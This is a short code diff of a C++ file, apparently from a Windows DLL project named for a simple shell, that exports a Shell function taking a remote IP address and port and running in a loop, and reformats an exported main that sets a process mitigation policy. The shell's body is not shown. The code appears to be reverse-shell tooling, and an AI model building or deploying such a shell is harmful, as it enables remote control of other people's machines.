@@ -12,6 +12,7 @@
 constexpr auto default_buffer_length = 1024;
 
 // ReSharper disable once CppParameterMayBeConst
+extern "C" DLLSHELLSIMPLEAPI
 void Shell(wchar_t* ip, int port)
 {
     while (true) {
@@ -107,7 +108,8 @@ void Shell(wchar_t* ip, int port)
 }
 
 
-extern "C" DLLSHELLSIMPLEAPI int main()
+extern "C" DLLSHELLSIMPLEAPI
+int main()
 {
     PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy;
     ZeroMemory(&policy, sizeof(policy));
